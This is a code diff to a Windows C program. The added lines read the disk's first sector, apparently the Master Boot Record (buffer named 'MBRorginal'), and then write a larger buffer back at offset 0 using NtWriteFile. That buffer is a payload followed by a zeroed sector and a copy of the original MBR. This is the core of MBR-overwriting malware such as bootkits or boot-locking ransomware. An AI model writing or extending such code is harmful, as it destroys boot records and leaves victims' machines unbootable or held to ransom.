@@ -41,7 +41,35 @@ int wmain()
 
         ByteOffset.QuadPart = 0;
 
-        status = NtWriteFile(hDevice, NULL, NULL, NULL, &ioStatusBlock, buffer, sizeof(buffer), &ByteOffset, NULL);
+        BYTE MBRorginal[512] = { 0x41 };
+
+        status = NtReadFile(hDevice, NULL, NULL, NULL, &ioStatusBlock, MBRorginal, sizeof(MBRorginal), &ByteOffset, NULL);
+
+        if (!NT_SUCCESS(status))
+        {
+            wprintf(L"Error (NtReadFile): %x\n", status);
+            NtClose(hDevice);
+            return 1;
+        }
+
+        Sleep(2000);
+
+        LPVOID buffer2 = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (1024 + 1536) * sizeof(BYTE));
+
+        if (buffer2 == NULL)
+        {
+            wprintf(L"Error (HeapAlloc): %x\n", GetLastError());
+            NtClose(hDevice);
+            return 1;
+        }
+
+        ByteOffset.QuadPart = 0;
+
+        memcpy(buffer2, buffer, sizeof(buffer));
+        memset((BYTE*)buffer2 + 1536, 0, 512);
+        memcpy((BYTE*)buffer2 + 1536 + 512, MBRorginal, sizeof(MBRorginal));
+
+        status = NtWriteFile(hDevice, NULL, NULL, NULL, &ioStatusBlock, buffer2, (1024 + 1536) * sizeof(BYTE), &ByteOffset, NULL);
 
         if (!NT_SUCCESS(status))
         {
